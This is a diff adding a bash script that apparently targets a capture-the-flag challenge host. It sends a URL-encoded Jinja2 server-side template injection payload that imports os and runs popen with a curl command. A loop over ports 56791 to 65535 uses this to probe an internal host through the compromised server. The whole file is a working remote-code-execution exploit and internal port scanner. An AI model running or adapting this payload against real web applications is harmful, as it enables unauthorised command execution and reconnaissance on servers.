@@ -1,0 +1,10 @@
+#! /bin/bash
+set -B
+a="https://ssti4.secu-web.blackfoot.dev/?username=%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27curl+toto8042%3A"
+b="%27%29.read%28%29%7D%7D"
+for i in {56791..65535}; do
+  c+=$a$i$b
+  curl -s -k 'GET' $c | grep 'Hello'
+  echo $i
+  c=""
+done
